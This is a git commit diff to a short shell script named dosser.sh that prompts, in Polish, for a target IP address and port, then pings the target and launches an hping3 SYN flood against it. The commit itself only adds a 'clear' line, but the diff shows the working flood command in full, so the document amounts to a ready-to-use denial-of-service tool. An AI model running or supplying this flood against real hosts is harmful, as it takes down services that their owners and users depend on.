f7ce17bc3721de33419df0b3c054c8bcf62c4a8a
Michał Kozłowski <51675112+KOZ1OL@users.noreply.github.com>
2022-05-13 19:45:25 +0200

    Update dosser.sh

--- Tools/dosser.sh
+++ Tools/dosser.sh
@@ -4,5 +4,6 @@ read -r -p "Wprowadź IP celu - " IP
 read -r -p "Wprowadź port celu - " PORT
 gnome-terminal -- sudo ping $IP
 sudo hping3 -S --flood -V -p $PORT $IP
+clear
 echo "Dziękuje za skorzystanie ze skryptu !"
 
